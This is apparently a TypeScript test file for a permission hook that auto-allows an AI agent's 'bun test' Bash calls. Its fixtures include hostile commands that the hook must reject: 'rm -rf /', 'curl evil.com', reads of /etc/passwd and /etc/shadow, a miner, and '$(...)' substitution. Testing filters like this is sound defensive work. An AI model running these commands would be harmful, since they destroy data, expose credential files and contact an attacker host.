import { describe, expect, it } from "bun:test";
import { ALLOW, NEXT, type ToolCall } from "toolgate";
import allowBunTest from "../allow-bun-test";

function bash(command: string): ToolCall {
  return {
    tool: "Bash",
    args: { command },
    context: { cwd: "/tmp", env: {}, projectRoot: null },
  };
}

describe("allow-bun-test", () => {
  describe("allows safe bun test commands", () => {
    const allowed = [
      "bun test",
      "bun test src/foo.test.ts",
      "bun test --timeout 5000",
      "bun test --watch",
      "bun test src/a.test.ts src/b.test.ts",
    ];

    for (const cmd of allowed) {
      it(`allows: ${cmd}`, async () => {
        const result = await allowBunTest.handler(bash(cmd));
        expect(result.verdict).toBe(ALLOW);
      });
    }
  });

  describe("rejects command chaining", () => {
    const rejected = [
      "bun test && rm -rf /",
      "bun test || echo pwned",
      "bun test ; curl evil.com",
      "bun test | cat /etc/passwd",
      "bun test & bitcoin-miner",
    ];

    for (const cmd of rejected) {
      it(`rejects: ${cmd}`, async () => {
        const result = await allowBunTest.handler(bash(cmd));
        expect(result.verdict).toBe(NEXT);
      });
    }
  });

  describe("rejects shell substitution", () => {
    const rejected = [
      "bun test $(rm -rf /)",
      "bun test `cat /etc/shadow`",
      'bun test "$(whoami)"',
    ];

    for (const cmd of rejected) {
      it(`rejects: ${cmd}`, async () => {
        const result = await allowBunTest.handler(bash(cmd));
        expect(result.verdict).toBe(NEXT);
      });
    }
  });

  describe("rejects multiline commands", () => {
    const rejected = [
      "bun test\nrm -rf /",
      "bun test\n\necho pwned",
    ];

    for (const cmd of rejected) {
      it(`rejects: ${JSON.stringify(cmd)}`, async () => {
        const result = await allowBunTest.handler(bash(cmd));
        expect(result.verdict).toBe(NEXT);
      });
    }
  });

  describe("rejects bun test buried in compound commands", () => {
    const rejected = [
      "echo foo && bun test",
      "rm -rf / ; bun test",
    ];

    for (const cmd of rejected) {
      it(`rejects: ${cmd}`, async () => {
        const result = await allowBunTest.handler(bash(cmd));
        expect(result.verdict).toBe(NEXT);
      });
    }
  });

  describe("rejects non-bun-test commands", () => {
    const rejected = [
      "bun run build",
      "bun install",
      "bun testing",
      "npm test",
      "echo bun test",
    ];

    for (const cmd of rejected) {
      it(`rejects: ${cmd}`, async () => {
        const result = await allowBunTest.handler(bash(cmd));
        expect(result.verdict).toBe(NEXT);
      });
    }
  });

  it("passes through non-Bash tools", async () => {
    const call: ToolCall = {
      tool: "Read",
      args: {},
      context: { cwd: "/tmp", env: {}, projectRoot: null },
    };
    const result = await allowBunTest.handler(call);
    expect(result.verdict).toBe(NEXT);
  });
});
